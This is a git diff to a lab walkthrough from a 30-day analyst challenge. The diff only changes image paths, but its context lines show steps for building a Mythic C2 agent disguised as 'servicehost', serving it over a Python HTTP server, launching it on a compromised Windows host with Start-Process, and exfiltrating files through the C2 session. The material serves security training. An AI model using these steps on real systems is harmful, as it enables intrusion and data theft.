@@ -14,7 +14,7 @@ Welcome to day 21 of the 30-day MyDFIR analyst challenge which I created for the
 4. Execution — build and deliver a Mythic agent
 5. Post-exploitation — interact with the C2 session and exfiltrate a file
 
-![Attack Diagram](../images/AttackDiagram.png)
+![Attack Diagram](../images/19-AttackDiagram.png)
 
 > **Important:** Do not target assets you do not own or do not have explicit permission to test. This is educational / lab work only.
 
@@ -143,7 +143,7 @@ install_github https://github.com/its-a-feature/Mythic_C2_Profiles/http
    * Name payload (demo: `servicehost-<handle>.exe`)
    * Create payload → Download the generated executable link
 
-![Mythic Payload](../images/mythic-payload.png)
+![Mythic Payload](../images/21-mythic-payload.png)
 
 3. On Mythic server, fetch payload and host with a simple HTTP server:
 
@@ -158,7 +158,7 @@ mv servicehost-stepnro.exe ~/www/one/
 cd ~/www/one
 python3 -m http.server 9999
 ```
-![Mythic Payload](../images/mythic-payload1.png)
+![Mythic Payload](../images/21-mythic-payload1.png)
 
 4. From the compromised Windows Server, download payload via PowerShell (demo used an `Invoke-WebRequest` style command):
 
@@ -187,7 +187,7 @@ Start-Process "$env:PUBLIC\Downloads\servicehost-stepnro.exe"
   * `get network info` / `ifconfig` (agent specific)
   * `download <path>` to retrieve files from the target
 
-![Mythic Payload](../images/mythic2.png)
+![Mythic Payload](../images/21-mythic2.png)
 
 **Demo file exfil:**
 
